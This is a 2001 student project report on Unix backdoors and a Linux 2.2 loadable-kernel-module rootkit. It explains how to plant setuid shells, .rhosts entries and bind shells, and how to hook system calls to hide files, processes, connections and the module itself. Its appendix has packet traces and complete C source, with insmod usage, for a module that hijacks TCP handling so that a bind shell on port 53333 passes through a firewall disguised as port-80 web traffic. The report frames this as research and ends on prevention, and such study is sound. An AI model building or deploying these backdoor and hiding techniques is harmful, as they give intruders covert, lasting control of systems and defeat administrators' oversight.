---
title: "Backdoor and Linux LKM Rootkit"
date: 2001-03-30T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-145"
---

[quack](https://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=5) (quack_at_xfocus.org)

CS290I Project Report


    Backdoor and Linux LKM Rootkit - smashing the kernel at your own risk


        by: Jingyu Zhou and Lin Qiao


Abstract: In this project, we look into various kinds of backdoor techniques

used in the wild, especially the Loadable Kernel Module (LKM). We found that

LKM backdoor is more sophisticated, more powerful, and less detectable than 

traditional backdoors. After knowing this, we decided to build our own powerful

rootkit based on LKM, which focused more on the TCP/IP layer, because we 

believe this is the right place to hide our backdoor from the system 

administrators.


----[ Introduction.


    In hacker's community, rootkit (or backdoor) is a very interesting subject. 

Various kinds of rootkits have been developed and distributed on the web. Among 

these rootkits, LKM is especially interesting, because it utilizes the module 

approach of modern operating system. Running as part of the kernel, this kind of 

rootkit becomes more powerful and less detectable than conventional ones. Once

installed on the victim machine, the system is under total control of the hacker.

Even the system administrator can't find any traces of compromise, because he 

can't trust the operating system any more.


    Our project is based on Linux kernel 2.2.x and we developed some powerful 

LKM's. The goal is to hide as many traces as possible and give various accesses

to the "malicious" user as much as possible.


    In the following sections of this paper, we will first explore the existing

backdoor techniques, then compare them to LKM approach, and finally describe our

LKM's design and implementation.


----[ Existing Backdoor Techniques - Make the System Administrator's life miserable.


    The goal of backdoor is to give access to the hacker even if the administrator

tries to secure it, with least amount of time and visibility.


    The backdoor that gives local user root access can be: set uid programs, 

trojaned system programs, cron job backdoor.

    1. Set uid programs. The hacker put some set uid shell program somewhere

       in the file system. Whenever he execute that program, he will become

       root.

    2. Trojaned system programs. The hacker changes some system programs,

       "login" program for example. Thus, whenever he does certain special

       things, those program will give him root access.

    3. Cron job backdoor. The hacker adds or modifies the jobs of the cron,

       at the time his program is running, he can get root access.


    The backdoor that gives remote user root access can be: ".rhost" file, ssh

authorized keys, bind shell, trojaned service.

    1. ".rhosts" file. Once "+ +" is in some user's .rhosts file, anybody can

        log into that account from anywhere without password.

    2. ssh authorized keys. The hacker put his public key into victim's ssh

       configuration file "authorized_keys", he can log into that account

       without password.

    3. Bind shell. The hacker bind the shell to certain TCP port. Anybody

       telnet to that port will have an interactive shell. More sophisticated

       backdoors of this kind can be UDP based, or unconnected TCP,  or even 

       ICMP based.

    4. Trojaned service. Any open service can be trojaned to give access to

       remote user. For example, trojaned the inetd program creates a bind shell

       at certain port, or trojaned ssh daemon give access to certain password.


    After the intruder plants and runs the backdoor, he wants the find some way

to fool the administrator that everything is just fine. This mainly includes two

concerns: how to hide his files and how to hide his processes.


    To hide files, the intruder can do following things: trojan some system commands

like "ls", "du", "fsck". At a very low level, they could modify the hard disk to

tag certain area as bad blocks and put his files there. Or if he is crazy enough, he

could put some file in the boot block.


    To hide processes, he could trojan "ps", modify argv[], or run as a legitimate

service. An interesting one is patching the program into an interrupt driven routine 

so it does not appear in the process table.


----[ LKM - What is More Elegant Than This?


    We have seen the common used techniques. Now the question arises: can the 

system administrator find out them? Actually, a good system administrator can 

easily find out 99% of them. The problem is that the intruder must modify or 

create some critical files. If the system administrator keeps a copy of the 

"tripwire" database, by running it will confirm the compromise. Browsing through

the file system will disclose the set uid programs, ".rhosts" files, etc.


    On the contrary, by using LKM we can effectively bypass all these

limitations. First of all, we don't have to modify or create any file in the

critical system directory. We can put out LKM in /tmp or /var/tmp, the

directory that system administrator can't monitor. Second, we can effectively

hide anything we want, such as files, processes, and network connections.

Because to get these information, the user must relied on the system calls.

Since we can modify the kernel structures, we can replace the original system

calls with our own version. And finally, we can be even more aggressive -

modify the TCP/IP stack and play the kernel for fun and profit!


    In the following sections, we will introduce the mechanisms we used and

our implementations. 


----[ Our LKM - "Kicking Kernel Ass From Left to Right" [3]


    Our LKM mainly focused on the TCP/IP implementations of the linux kernel

2.2.x, because a perfect backdoor must give remote user access to the system.

Opening a port and running a server on the victim machine is too risky. We want

everything to be as stealthy as possible.


    The first idea is we will not run any process on the victim machine

waiting for connections. Instead, we build this functionality into the TCP/IP

stack. Whenever a special UDP or TCP packet is received, the kernel will check

this packet to see if this is the specially crafted packet. If it is, the

kernel will launch a process to execute commands within that packet. We can 

also use any other protocol's packet, as long as they are supported by the 

kernel.


    Now is the implementation. In the kernel, each protocol register they

handler routine in *inet_protocol_base pointer and *inet_protos[MAX_INET_PROTOS]

hash. When system initializes, all the supported protocols are registered in

inet_protocol_base. Then they are added to the inet_protos hash. Whenever an IP

packet is received, kernel will check the hash for appropriate handler and

call that function. Our hack is at this point. We will replace the original

protocol handlers with our own handlers. Thus we can intercept the packet and

analyze it. If it's what we want, we will execute the command. If not, just

call the original function.


    The reason we implemented both handler for both UDP and TCP is that if the

there is some firewall installed. UDP packet may not go through. Since we only

need to send one packet to the victim, source IP address can be spoofed.

Besides, for TCP packet, it's not necessarily the SYN packet, actually our 

client program is using ACK packet now.


    The second idea is even more interesting. What if the victim machine is a

web server and the firewall installed somewhere only allows the web traffic goes

through? Can we get an interactive shell? The answer is YES. And the idea is

as follows:

    ____________                           _________________________

    | Attacker |                           |    web server         |

    |          |                           |   80 <=======> 53333  |

    |__________|                           |_______________________|

         |                                     |

     |                                     |

     |_____________________________________|

             1025 ==> 80   or   1025 <== 80


    Suppose we have launched some bind shell backdoor on the web server which

is listening on port 53333 (this can be accomplished by using the first idea).

Now what we want is somehow at the web server, the traffic from attacker to port

80 will be redirected to port 53333, and the traffic from 53333 to attacker

will be changed to port 80.


    Implementations. Change the incoming packet is easy, we can borrow the

idea from first LKM - do the check whenever receiving a TCP packet and change

destination port if necessary. To change the outbound packets, it's a little

bit difficult. Because the TCP/IP stack implemented in the linux kernel

statically reference the lower level functions. It's not easy to replace the

protocol routines (but it's possible, see appendix for details). What we do is

exploiting the fact that most linux distributions compiled with firewall

operations. Each incoming, forwarding, or outgoing packet must goes through

the firewall. And the firewall functions can be dynamically added into the

kernel! We use system exported function register_firewall() to insert our

routines before system firewall routines. If we see any packet from port 53333,

we will automatically change it to 80.


    Additional details of this implementation are that whenever we change the

packet, we have to re-compute the checksum. And more interesting thing is that

if we sniff the network traffic at web server and at some other machines, we

will see they are different. The sniffer at another machine sees the traffic

just like normal web traffic, but the sniffer at the web server sees nonsense

traffic. Details are in the appendix.


    Now let's talk about the hacking of system calls. This is mainly for the

purpose of doing nasty stuff locally. To hide the trace of intrusion, the

files, processes, network connections must be hidden from the system

administrator. Since these information must be obtained from specific system

calls, we can just replace the interesting system calls.

    1. Hide files. Commands like "ls", "du" use sys_getdents() to get the

       information of a directory. The LKM will just filter out our files

       so that they are hidden from anybody.

    2. Hide processes. In the linux implementation, process information is 

       mapped to a directory in /proc file system. So our hack is still

       modify sys_getdents() with additional effor of marking this process

       as invisible in the task structure. The normal implementation is to

       set task's flag (signal number) to some unused value, 31 for

       example.

    3. Hide network connections. Similar to process hiding, in this case

       we are trying to hide something inside /proc/net/tcp and

       /proc/net/udp files. So we trojan the sys_read(). Whenever reading

       these two files and a line matching certain string, the system call

       won't tell the user it.

    4. File execution redirect. Sometimes, the intruder may want to

       replace the system binaries, like "login", but doesn't want to change

       the file. He can replace sys_execve(). Thus, whenever the system

       tries to execute the "login" program, it will be re-directed to

       execute the intruder's version of login program.

    5. Hide sniffer. Here we refer to hidng the promiscuous flag of the

       network interface. The system call to trojan in this case is

       sys_ioctl().

    6. Communicate with LKM. The hacker has his nice LKM installed. Now he

       wants to tell the kernel to hide another file. How can he do it? We

       know the normal way from the user land to talk to kernel land is

       through the system calls, so we have to modify some system calls.

       For example, we could replace sys_settimeofday(). When a special

       parameter is passed, our system call will do appropriate things for

       us.

    7. Hide LKM. A perfect LKM must be able to hide itself from the

       administrator. The LKM's in the system are kept in a single linked

       list, to hide our LKM we can just remove it from the list so that

       command like "lsmod" won't show it.

    8. Hide symbols in the LKM. Normally functions defined in the LKM will

       be exported so that other LKM can use them. Since we are the bad

       guy, hiding these symbols is necessary. Fortunately, there is a

       macro we can use "EXPORT_NO_SYMBOLS". Put this at the end of LKM

       prevents any symbol from being exported.


----[ Experiences and Conclusions.


    Doing LKM stuff is both interesting and dangerous. The interesting part is

that you can play with the kernel and do whatever you want. But it's also very

dangerous, it may disrupt your services, corrupt your data, and do any weird

thing to your machine. What we have experienced include: network layer doesn't

work after several days of installing LKM, re-starting network layer only

works about five minutes; whenever sending out a packet, the application like 

telnet, netscape, pine will core dumped; system reboot immediately after install

LKM. So, as the title, play the LKM at your own risk!


    Another thing I want to mention is that writing LKM will give you a better

idea of how the system works. For example, the /proc file system is a very

nice feature. Because LKM works in kernel space, the debugging of LKM becomes

more difficult than normal programs. Using kernel function "printk" may solve

some problems, but it's not so elegant. By registering our data structure

as a file or directory in the /proc file system, we can read the content of

kernel memory at any time. We can even modify the kernel memory by writing to

this file, although normally this is not supported.


    Conclusions. From the experiences in this project, it's clear that if LKM

is enabled in the linux (almost 100% true) installation, once the system was

broken into and had LKM rootkit installed, it's almost impossible to find it.

Because even the operating system can't be trusted. The only way to find the

intruder is from some other network stations to sniff the network traffic and

analyze it, if shutting down machine is not allowed. Or, using another operating

system to check the hard disk. All these two methods are both very hard to do,

because you must be very sure what your are looking for.


    So, the best security is to prevent the system from being broken into.


----[ References.


1. Bypassing Integrity Checking Systems.

[http://phrack.infonexus.com/search.phtml?view&article;=p51-9](http://phrack.infonexus.com/search.phtml?view&article=p51-9)


2. Weakening the Linux Kernel.

[http://phrack.infonexus.com/search.phtml?view&article;=p52-18](http://phrack.infonexus.com/search.phtml?view&article=p52-18)


3. Building Into The Linux Network Layer.

[http://phrack.infonexus.com/search.phtml?view&article;=p55-12](http://phrack.infonexus.com/search.phtml?view&article=p55-12)


4. (nearly) Complete Linux Loadable Kernel Modules.

[http://packetstorm.securify.com/groups/thc/LKM_HACKING.html](http://packetstorm.securify.com/groups/thc/LKM_HACKING.html)


5. Backdoors. [http://www.dataguard.no/bugtraq/1997_3/0310.html](http://www.dataguard.no/bugtraq/1997_3/0310.html)


6. Runtime Kernel Kmem Patching.

[http://www.big.net.au/~silvio/runtime-kernel-kmem-patching.txt](http://www.big.net.au/~silvio/runtime-kernel-kmem-patching.txt)


----[ Appendix


1. Replace the protocol routines to change outbound packets.


    In the linux kernel, each BSD socket is actually a socket/sock pair in the

kernel structure. The sending-packet-out routine will uses tcp_opt* member of

the sock structure, which in turn uses af_specific member. What's interesting

here is that all the ipv4 use the same address, i.e., all af_specific will

point to the same address in the kernel, which is a structure holding a set of

routines. What if we can modify the function address in that "tcp_func"

instance?


    The idea is simple, but the implementation is not easy. Because there is

no easy way to get the address of that structure. One possible way is like this:

from the process list (task structure list) find it's open files; then from

these files find one that actually points to a socket; and from that socket

get the address of sock structure; finally get the address of "ipv4_specific".


    The structures we must goes through in this process is: task -> files_struct

-> file -> inode -> socket -> sock -> tcp_opt -> tcp_func.


    Another way is much more difficult and dangerous. The idea is inspired

from [6]. We can search though the kernel memory and find exactly the function

we want to patch. Then modify the kernel memory. Possibly first jump to the

address of our code and then jump back the the rest of the routine.


2. Traffic sniffed from both the web server and a network station.


    In this scenario, mamet is the server with our backdoor installed and

leone is the attacker. 


The first tcpdump trace is the traffic from some network station other than 

mamet. We will find that it's just NORMAL. Port 2603 at leone is talking to

port 80 at mamet:


14:16:27.214888 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: S

3840116896:3840116896(0) win 32120 <mss 1460,sackOK,timestamp 14616818

0,nop,wscale 0> (DF)

14:16:27.215190 eth0 < mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: S

3561828491:3561828491(0) ack 3840116897 win 32120 <mss 1460,sackOK,timestamp

1547802 14616818,nop,wscale 0> (DF)

14:16:27.215336 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: .

1:1(0) ack 1 win 32120 <nop,nop,timestamp 14616819 1547802> (DF)

14:16:27.313396 eth0 < mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: P

1:39(38) ack 1 win 32120 <nop,nop,timestamp 1547812 14616819> (DF)

14:16:27.313539 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: .

1:1(0) ack 39 win 32120 <nop,nop,timestamp 14616828 1547812> (DF)

14:16:30.166613 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: P

1:6(5) ack 39 win 32120 <nop,nop,timestamp 14617114 1547812> (DF)

14:16:30.166895 eth0 < mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: .

39:39(0) ack 6 win 32120 <nop,nop,timestamp 1548097 14617114> (DF)

14:16:30.190287 eth0 < mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: P

39:127(88) ack 6 win 32120 <nop,nop,timestamp 1548099 14617114> (DF)

14:16:30.205280 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: .

6:6(0) ack 127 win 32120 <nop,nop,timestamp 14617118 1548099> (DF)

14:16:30.205548 eth0 < mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: P

127:157(30) ack 6 win 32120 <nop,nop,timestamp 1548101 14617118>

(DF)14:16:30.225281 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: .

6:6(0) ack 157 win 32120 <nop,nop,timestamp 14617120 1548101> (DF)

14:16:35.664222 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: P

6:17(11) ack 157 win 32120 <nop,nop,timestamp 14617663 1548101> (DF)

14:16:35.676943 eth0 < mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: P

157:236(79) ack 17 win 32120 <nop,nop,timestamp 1548648 14617663> (DF)

14:16:35.695279 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: .

17:17(0) ack 236 win 32120 <nop,nop,timestamp 14617667 1548648> (DF)

14:16:35.695561 eth0 < mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: P

236:266(30) ack 17 win 32120 <nop,nop,timestamp 1548650 14617667> (DF)

14:16:35.715282 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: .

17:17(0) ack 266 win 32120 <nop,nop,timestamp 14617669 1548650> (DF)

14:16:40.099813 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: P

17:23(6) ack 266 win 32120 <nop,nop,timestamp 14618107 1548650> (DF)

14:16:40.103771 eth0 < mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: P

266:300(34) ack 23 win 32120 <nop,nop,timestamp 1549091 14618107> (DF)

14:16:40.115282 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: .

23:23(0) ack 300 win 32120 <nop,nop,timestamp 14618109 1549091> (DF)

14:16:42.196173 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: P

23:30(7) ack 300 win 32120 <nop,nop,timestamp 14618317 1549091> (DF)

14:16:42.199260 eth0 < mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: F

300:300(0) ack 30 win 32120 <nop,nop,timestamp 1549300 14618317>

(DF)14:16:42.199399 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: .

30:30(0) ack 301 win 32120 <nop,nop,timestamp 14618317 1549300> (DF)

14:16:42.199806 eth0 > leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.www: F

30:30(0) ack 301 win 32120 <nop,nop,timestamp 14618317 1549300> (DF)

14:16:42.200052 eth0 < mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: .

301:301(0) ack 31 win 32120 <nop,nop,timestamp 1549300 14618317> (DF)


    Here is the trace collected at mamet (the web server) of the same session.

It looks weird in a sense that when leone at port 2603 is trying to talk to

port 53333 at mamet, and the web server responds! Here the incoming packet of

the tcpdump is actually the modified version.


14:12:16.042692 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: S

3840116896:3840116896(0) win 32120 <mss 1460,sackOK,timestamp 14616818

0,nop,wscale 0> (DF)

14:12:16.042844 eth0 > mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: S

3561828491:3561828491(0) ack 3840116897 win 32120 <mss 1460,sackOK,timestamp

1547802 14616818,nop,wscale 0> (DF)

14:12:16.043136 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: .

3840116897:3840116897(0) ack 3561828492 win 32120 <nop,nop,timestamp 14616819

1547802> (DF)

14:12:16.141022 eth0 > mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: P

1:39(38) ack 1 win 32120 <nop,nop,timestamp 1547812 14616819> (DF)

14:12:16.141340 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: .

0:0(0) ack 39 win 32120 <nop,nop,timestamp 14616828 1547812> (DF)

14:12:18.994434 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: P

0:5(5) ack 39 win 32120 <nop,nop,timestamp 14617114 1547812> (DF)

14:12:18.994567 eth0 > mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: .

39:39(0) ack 6 win 32120 <nop,nop,timestamp 1548097 14617114> (DF)

14:12:19.017933 eth0 > mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: P

39:127(88) ack 6 win 32120 <nop,nop,timestamp 1548099 14617114> (DF)

14:12:19.033100 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: .

5:5(0) ack 127 win 32120 <nop,nop,timestamp 14617118 1548099> (DF)

14:12:19.033222 eth0 > mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: P

127:157(30) ack 6 win 32120 <nop,nop,timestamp 1548101 14617118>

(DF)14:12:19.053099 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: .

5:5(0) ack 157 win 32120 <nop,nop,timestamp 14617120 1548101> (DF)

14:12:24.492064 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: P

5:16(11) ack 157 win 32120 <nop,nop,timestamp 14617663 1548101> (DF)

14:12:24.504619 eth0 > mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: P

157:236(79) ack 17 win 32120 <nop,nop,timestamp 1548648 14617663> (DF)

14:12:24.523115 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: .

16:16(0) ack 236 win 32120 <nop,nop,timestamp 14617667 1548648> (DF)

14:12:24.523259 eth0 > mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: P

236:266(30) ack 17 win 32120 <nop,nop,timestamp 1548650 14617667> (DF)

14:12:24.543124 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: .

16:16(0) ack 266 win 32120 <nop,nop,timestamp 14617669 1548650> (DF)

14:12:28.927675 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: P

16:22(6) ack 266 win 32120 <nop,nop,timestamp 14618107 1548650> (DF)

14:12:28.931467 eth0 > mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: P

266:300(34) ack 23 win 32120 <nop,nop,timestamp 1549091 14618107> (DF)

14:12:28.943147 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: .

22:22(0) ack 300 win 32120 <nop,nop,timestamp 14618109 1549091> (DF)

14:12:31.024044 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: P

22:29(7) ack 300 win 32120 <nop,nop,timestamp 14618317 1549091> (DF)

14:12:31.026978 eth0 > mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: F

300:300(0) ack 30 win 32120 <nop,nop,timestamp 1549300 14618317>

(DF)14:12:31.027268 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: .

29:29(0) ack 301 win 32120 <nop,nop,timestamp 14618317 1549300> (DF)

14:12:31.027669 eth0 < leone.cs.ucsb.edu.2603 > mamet.cs.ucsb.edu.53333: F

29:29(0) ack 301 win 32120 <nop,nop,timestamp 14618317 1549300> (DF)

14:12:31.027780 eth0 > mamet.cs.ucsb.edu.www > leone.cs.ucsb.edu.2603: .

301:301(0) ack 31 win 32120 <nop,nop,timestamp 1549300 14618317> (DF)


    If you are creative enough, you can even hide the traffic from local

sniffer. In this case, sniffer at mamet won't see the connection from leone.


3. file "test.c"


/*

 * Compile:

 *     gcc -O2 -c test.c -I/usr/src/linux/include -fomit-frame-pointer

 *

 * Usage:

 *    insmod test.o ip=128.111.48.44

 *    here ip is the attacker's IP and must be in numeric format

 */


#define MODULE

#define __KERNEL__


#include <linux/config.h>

#include <linux/module.h>

#include <linux/version.h>

#include <linux/skbuff.h>


#include <net/protocol.h>

#include <linux/netdevice.h>

#include <net/pkt_sched.h>

#include <net/tcp.h>

#include <net/ip.h>

#include <linux/if_ether.h>

#include <linux/ip.h>

#include <linux/tcp.h>

#include <linux/icmp.h>

#include <linux/firewall.h>


#include <linux/kernel.h>

#include <linux/mm.h>

#include <linux/file.h>

#include <asm/uaccess.h>


/* Define here if you want to swap ports also */

#define REALPORT        53333           /* port you which to communicate */

#define FAKEPORT        80              /* port that appears on the wire */


int my_tcp_v4_rcv(struct sk_buff *skb, unsigned short len);

__u32 in_aton(const char *);

int my_default_firewall(struct firewall_ops *this, int pf, 

    struct device *dev, void *phdr, void *arg, struct sk_buff **skb);

int my_call_out_firewall(struct firewall_ops *this, int pf, 

    struct device *dev, void *phdr, void *arg, struct sk_buff **skb);


unsigned long int magic_ip;

char *ip;

MODULE_PARM(ip, "s");

struct inet_protocol *original_tcp_protocol;


struct inet_protocol my_tcp_protocol =

{

    &my_tcp_v4_rcv,

    NULL,

    NULL,

    IPPROTO_TCP,

    0,

    NULL,

    "TCP"

};


/*

 * <linux/firewall.h>

 *

 * 18 struct firewall_ops

 * 19 {

 * 20         struct firewall_ops *next;

 * 21         int (*fw_forward)(struct firewall_ops *this, int pf, 

 * 22                         struct device *dev, void *phdr, void *arg, struct sk_buff **pskb);

 * 23         int (*fw_input)(struct firewall_ops *this, int pf, 

 * 24                         struct device *dev, void *phdr, void *arg, struct sk_buff **pskb);

 * 25         int (*fw_output)(struct firewall_ops *this, int pf, 

 * 26                         struct device *dev, void *phdr, void *arg, struct sk_buff **pskb);

 * 27         / * Data falling in the second 486 cache line isn't used directly

 * 28            during a firewall call and scan, only by insert/delete and other

 * 29            unusual cases

 * 30          * /

 * 31         int fw_pf;              / * Protocol family                      * /      

 * 32         int fw_priority;        / * Priority of chosen firewalls         * /

 * 33 };

 */

struct firewall_ops my_fw_ops=

{

    NULL,

    &my_default_firewall,

    &my_default_firewall,

    &my_call_out_firewall,

    PF_INET,

    5       /* We are a little bit larger than default firewall which is 0 */

};


int my_default_firewall(

    struct firewall_ops *this, 

    int pf, 

    struct device *dev, 

    void *phdr, 

    void *arg, 

    struct sk_buff **skb)

{

    return    FW_SKIP;

}


/*

 * When sending a packet out, if the destination address == magic_ip

 * and source tcp port == real port, change source port to fake port

 * and re-compute the checksum.

 */

int my_call_out_firewall(

    struct firewall_ops *this, 

    int pf, 

    struct device *dev, 

    void *phdr, 

    void *arg, 

    struct sk_buff **skb)

{

    struct sk_buff *sk = *skb;

    struct iphdr *iph = (struct iphdr *) phdr;

    struct tcphdr *th = (struct tcphdr *)((__u32 *)iph+iph->ihl);

    unsigned short size;

    int doff = 0;

    int csum = 0;

    int offset;


        if (    iph->daddr == magic_ip && 

        iph->protocol == IPPROTO_TCP &&

        th->source == htons(REALPORT) ) {


        th->source = htons(FAKEPORT);


        size = ntohs(iph->tot_len) - (iph->ihl * 4);

        doff = th->doff << 2;

        sk->csum = 0;

        csum = csum_partial( sk->h.raw + doff, size - doff, 0 );

        sk->csum = csum;


        th->check = 0;

        th->check = csum_tcpudp_magic(

                iph->saddr,

                iph->daddr,

                size,

                iph->protocol,

                csum_partial(sk->h.raw, doff, sk->csum)

                );

        }


    return FW_SKIP;

}


/*

 * When receving a packet here, if the source IP == magic_ip and

 * destination port == fake port, change the destination port to

 * real port and re-compute the checksum.

 * Call the original routine.

 */

int my_tcp_v4_rcv(struct sk_buff *skb, unsigned short len)

{

    struct tcphdr *th;

    struct iphdr *iph;

    unsigned short size;

    int doff = 0;

    int csum = 0;

    int offset;


        if (  skb->nh.iph->saddr == magic_ip && 

          skb->h.th->dest == htons(FAKEPORT) ) {

        skb->h.th->dest = htons(REALPORT);


        th = skb->h.th;

        iph = skb->nh.iph;


        size = ntohs(iph->tot_len) - (iph->ihl * 4);

        doff = th->doff << 2;

        skb->csum = 0;

        csum = csum_partial( skb->h.raw + doff, size - doff, 0 );

        skb->csum = csum;


        th->check = 0;

        th->check = csum_tcpudp_magic(

                iph->saddr,

                iph->daddr,

                size,

                iph->protocol,

                csum_partial(skb->h.raw, doff, skb->csum)

                );

        }


out:

    return (original_tcp_protocol->handler) ( skb, len );

}


/*

 *      Convert an ASCII string to binary IP.

 */


__u32 in_aton(const char *str) {

        unsigned long l;

        unsigned int val;

        int i;


        l = 0;

        for (i = 0; i < 4; i++) {

                l <<= 8;

                if (*str != '\0') {

                        val = 0;

                        while (*str != '\0' && *str != '.') {

                                val *= 10;

                                val += *str - '0';

                                str++;

                        }

                        l |= val;

                        if (*str != '\0')

                                str++;

                }

        }

        return    (htonl(l));

}


int init_module() {


        if(!ip) {

                printk("Error: missing end-host ip.\n");

                printk("Usage: insmod test.o ip=x.x.x.x\n\n");

                return -ENXIO;

        }               

        magic_ip = in_aton(ip);


    /* replace the original tcp protocol */

    inet_add_protocol(&my_tcp_protocol);

    original_tcp_protocol = my_tcp_protocol.next;

    inet_del_protocol(original_tcp_protocol);


    /* insert our firewall routines here */

    if ( register_firewall( PF_INET, &my_fw_ops ) < 0 ) {

        printk("panic: can't load my firewall!\n");

    }


    printk("test loaded\n");

    return    0;

}


void cleanup_module() {

    /* remove our tcp routine, insert the original one */

    inet_add_protocol(original_tcp_protocol);

    inet_del_protocol(&my_tcp_protocol);


    /* remove our firewall routine */

    unregister_firewall( PF_INET, &my_fw_ops );


    printk("test unloaded\n");

}
